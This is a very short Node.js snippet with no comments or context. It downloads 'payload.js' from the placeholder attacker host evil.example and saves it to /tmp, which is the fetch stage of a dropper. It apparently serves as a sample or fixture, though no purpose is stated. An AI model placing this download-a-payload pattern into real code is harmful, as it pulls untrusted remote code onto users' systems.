const https = require("https");
const fs = require("fs");

https.get("https://evil.example/payload.js", (res) => {
  res.pipe(fs.createWriteStream("/tmp/payload.js"));
});
